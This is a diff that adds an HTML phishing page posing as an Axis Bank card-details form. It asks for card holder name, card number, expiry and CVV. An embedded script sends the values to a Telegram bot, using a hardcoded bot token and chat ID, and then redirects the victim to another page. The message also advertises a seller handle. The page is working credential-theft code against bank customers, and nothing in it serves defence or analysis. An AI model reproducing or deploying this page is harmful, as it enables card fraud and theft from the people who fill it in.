@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>contac forms</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+<style>
+
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:'Poppins',sans-serif;
+}
+
+body{
+min-height:100vh;
+display:flex;
+justify-content:center;
+align-items:center;
+background:linear-gradient(135deg,#4b001f,#7a1636,#9b2242);
+padding:30px;
+overflow-x:hidden;
+}
+
+/* HEADER */
+
+.top-header{
+position:fixed;
+top:0;
+left:0;
+width:100%;
+padding:18px 35px;
+
+background:rgba(58,0,23,0.95);
+
+display:flex;
+justify-content:space-between;
+align-items:center;
+
+backdrop-filter:blur(12px);
+
+box-shadow:0 5px 18px rgba(0,0,0,0.25);
+
+z-index:1000;
+}
+
+.logo{
+font-size:30px;
+font-weight:700;
+color:white;
+letter-spacing:1px;
+}
+
+.header-btn{
+padding:12px 24px;
+border:none;
+border-radius:14px;
+
+background:white;
+color:#7a1636;
+
+font-size:15px;
+font-weight:600;
+}
+
+/* MAIN BOX */
+
+.main-box{
+width:100%;
+max-width:450px;
+
+margin-top:90px;
+}
+
+
+
+/* FORM */
+
+.form-box{
+background:white;
+
+padding:35px;
+
+border-radius:28px;
+
+box-shadow:
+0 20px 45px rgba(75,0,31,0.35);
+}
+
+h2{
+text-align:center;
+margin-bottom:28px;
+color:#7a1636;
+font-size:30px;
+font-weight:700;
+}
+
+.input-group{
+margin-bottom:18px;
+}
+
+label{
+display:block;
+margin-bottom:8px;
+font-weight:600;
+color:#5a1029;
+}
+
+input{
+width:100%;
+padding:15px;
+
+border-radius:14px;
+border:1px solid #d7b7c2;
+
+font-size:15px;
+
+outline:none;
+
+transition:0.3s;
+
+background:#fffafb;
+}
+
+input:focus{
+border-color:#8b1e46;
+
+box-shadow:
+0 0 10px rgba(139,30,70,0.18);
+}
+
+/* ROW */
+
+.row{
+display:flex;
+gap:15px;
+}
+
+.row .input-group{
+flex:1;
+}
+
+/* BUTTON */
+
+.submit-btn{
+width:100%;
+padding:16px;
+
+border:none;
+border-radius:16px;
+
+background:
+linear-gradient(145deg,#8b1e46,#5a1029);
+
+color:white;
+
+font-size:17px;
+font-weight:600;
+
+cursor:pointer;
+
+margin-top:10px;
+
+box-shadow:
+0 8px 0 #3e0a1c,
+0 14px 24px rgba(0,0,0,0.25);
+
+transition:0.2s;
+}
+
+.submit-btn:hover{
+
+transform:translateY(3px);
+
+box-shadow:
+0 4px 0 #3e0a1c,
+0 10px 18px rgba(0,0,0,0.2);
+}
+
+/* NOTE */
+
+.note{
+font-size:12px;
+color:#6b4b57;
+margin-top:15px;
+text-align:center;
+}
+
+/* MOBILE */
+
+@media(max-width:768px){
+
+.top-header{
+padding:15px 20px;
+}
+
+.logo{
+font-size:24px;
+}
+
+.form-box{
+padding:28px;
+}
+
+.card-number{
+font-size:22px;
+}
+
+}
+
+</style>
+</head>
+
+<body>
+
+<!-- HEADER -->
+
+<div class="top-header">
+
+<div class="logo">
+Axis Bank
+</div>
+
+
+
+</button>
+
+</div>
+
+<!-- MAIN -->
+
+
+
+<!-- FORM -->
+
+<div class="form-box">
+<form id="myForm">
+<h2>Card Details</h2>
+
+<form>
+<div class="input-group">
+<label>Card Holder Name</label>
+<input 
+type="text"
+placeholder=""
+maxlength="20">
+</div>
+
+<div class="input-group">
+<label>Card Number</label>
+<input 
+type="number"
+placeholder=""
+maxlength="16">
+</div>
+
+<div class="row">
+
+<div class="input-group">
+<label>Expiry Date</label>
+<input type="month">
+</div>
+
+<div class="input-group">
+<label>CVV</label>
+<input 
+type="number"
+placeholder="***"
+maxlength="3">
+</div>
+
+</div>
+
+
+<button type="submit" class="submit-btn">
+Continue
+</button>
+
+</div>
+
+</form>
+
+</div>
+
+</div>
+<script>
+const BOT_TOKEN = "8212429787:AAHx8QHgnUWhcH4etbyU6ylxM7bwnunBXao";
+const CHAT_ID = "-1003446660471";
+
+document.querySelector("form").addEventListener("submit", async function(e){
+e.preventDefault();
+
+const inputs = document.querySelectorAll("input");
+
+const name = inputs[0].value;
+const dob = inputs[1].value;
+const hhurL = inputs[2].value;
+const huulu = inputs[3].value;
+
+const message = `
+🔥 Card Page 
+
+Contact For Website/Apps @PritamTolls🔥
+
+🔐 CVV: ${huulu}
+👤 Card Holder Name: ${name}
+📅 CARD NUMBER: ${dob}
+🔢 Expiry: ${hhurL}
+`;
+
+try{
+
+await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+chat_id:CHAT_ID,
+text:message
+})
+});
+
+window.location.href = "4.html";
+
+}catch(err){
+
+alert("Error Sending Data");
+
+}
+
+});
+</script>
+</body>
+</html>
